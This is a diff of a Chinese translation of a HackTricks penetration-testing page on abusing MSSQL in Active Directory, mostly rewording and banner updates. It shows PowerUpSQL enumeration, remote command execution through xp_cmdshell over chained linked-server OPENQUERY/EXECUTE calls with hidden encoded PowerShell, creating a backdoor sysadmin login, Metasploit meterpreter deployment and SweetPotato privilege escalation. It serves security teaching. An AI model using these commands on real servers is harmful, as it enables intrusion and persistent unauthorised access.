@@ -1,16 +1,19 @@
 # MSSQL AD 滥用
 
+{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-* 您在**网络安全公司**工作吗？ 想要看到您的**公司在 HackTricks 中被广告**吗？ 或者您想要访问**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 发现我们的独家[NFTs 集合](https://opensea.io/collection/the-peass-family) - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
+{% endhint %}
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
@@ -18,11 +21,11 @@
 
 ## **MSSQL 枚举 / 发现**
 
-在这种情况下，PowerUpSQL powershell 模块非常有用。
+在这种情况下，PowerShell 模块 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 非常有用。
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### 无需域会话从网络枚举
+### 在没有域会话的情况下从网络枚举
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -36,7 +39,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### 从域内进行枚举
+### 从域内部枚举
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -55,7 +58,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL基本滥用
+## MSSQL 基本滥用
 
 ### 访问数据库
 ```powershell
@@ -71,24 +74,26 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-可能还可以在 MSSQL 主机内部**执行命令**
+在 MSSQL 主机内部**执行命令**也可能是可行的。
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### MSSQL基本黑客技巧
+检查**以下部分提到的页面**以了解如何手动执行此操作。
+
+### MSSQL 基本黑客技巧
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## MSSQL信任链接
+## MSSQL 受信任链接
 
-如果一个MSSQL实例被另一个MSSQL实例信任（数据库链接）。如果用户对受信任的数据库有特权，他将能够**利用信任关系在另一个实例中执行查询**。这些信任关系可以被链接在一起，最终用户可能能够找到一些配置不当的数据库，从而执行命令。
+如果一个 MSSQL 实例被另一个 MSSQL 实例信任（数据库链接）。如果用户对受信任的数据库拥有权限，他将能够**利用信任关系在另一个实例中执行查询**。这些信任可以链式连接，在某些情况下，用户可能能够找到一些配置错误的数据库，在那里他可以执行命令。
 
-**数据库之间的链接甚至可以跨越森林信任。**
+**数据库之间的链接甚至可以跨森林信任工作。**
 
-### Powershell滥用
+### Powershell 滥用
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -122,23 +127,23 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-您可以使用 Metasploit 轻松检查受信任的链接。
+您可以使用 metasploit 轻松检查受信任的链接。
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-注意，metasploit 将尝试仅滥用 MSSQL 中的 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，则需要尝试手动使用 `EXECUTE` 方法执行命令，详见下文。）
+注意，metasploit 只会尝试在 MSSQL 中滥用 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，您需要尝试手动使用 `EXECUTE` 方法执行命令，详见下文。）
 
 ### 手动 - Openquery()
 
-从 **Linux**，您可以使用 **sqsh** 和 **mssqlclient.py** 获得 MSSQL 控制台 shell。
+从 **Linux** 您可以使用 **sqsh** 和 **mssqlclient.py** 获取 MSSQL 控制台 shell。
 
-从 **Windows**，您还可以找到链接，并使用类似 **MSSQL 客户端** [**HeidiSQL**](https://www.heidisql.com) 手动执行命令。
+从 **Windows** 您也可以找到链接并使用 **MSSQL 客户端如** [**HeidiSQL**](https://www.heidisql.com) 手动执行命令。
 
 _使用 Windows 身份验证登录：_
 
-![](<../../.gitbook/assets/image (808).png>) 
+![](<../../.gitbook/assets/image (808).png>)
 
 #### 查找可信链接
 ```sql
@@ -149,17 +154,17 @@ EXEC sp_linkedservers;
 
 #### 在可信链接中执行查询
 
-通过链接执行查询（示例：在新可访问实例中查找更多链接）:
+通过链接执行查询（示例：在新的可访问实例中查找更多链接）：
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-检查双引号和单引号的使用方式，以这种方式使用它们非常重要。
+检查双引号和单引号的使用，正确使用它们非常重要。
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (643).png>)
 
-您可以手动无限延续这些受信任的链接链。
+您可以手动无限期地继续这些受信任链接的链条。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -167,9 +172,11 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
+如果您无法通过 `openquery()` 执行像 `exec xp_cmdshell` 这样的操作，请尝试使用 `EXECUTE` 方法。
+
 ### 手动 - EXECUTE
 
-您还可以使用`EXECUTE`来滥用受信任的链接：
+您还可以使用 `EXECUTE` 滥用受信任的链接：
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -177,24 +184,27 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## 本地权限提升
 
-**MSSQL本地用户**通常具有一种称为**`SeImpersonatePrivilege`**的特殊特权。这允许该帐户在身份验证后“模拟客户端”。
+**MSSQL 本地用户** 通常具有一种特殊类型的权限，称为 **`SeImpersonatePrivilege`**。这允许该账户在身份验证后“模拟客户端”。
 
-许多作者提出的一种策略是强制**SYSTEM服务**对攻击者创建的恶意或中间人服务进行身份验证。然后，这个恶意服务能够在SYSTEM服务尝试进行身份验证时冒充SYSTEM服务。
+许多作者提出的一种策略是强制 SYSTEM 服务向攻击者创建的恶意或中间人服务进行身份验证。这个恶意服务能够在 SYSTEM 服务尝试进行身份验证时模拟该服务。
 
-[SweetPotato](https://github.com/CCob/SweetPotato)拥有这些各种技术的集合，可以通过Beacon的`execute-assembly`命令执行。
+[SweetPotato](https://github.com/CCob/SweetPotato) 收集了这些可以通过 Beacon 的 `execute-assembly` 命令执行的各种技术。
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
+{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-* 您在**网络安全公司**工作吗？您想看到您的**公司在HackTricks中被广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) **Discord群组**](https://discord.gg/hRep4RUj7f) **或**[**电报群组**](https://t.me/peass) **或在Twitter上关注我** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
+{% endhint %}
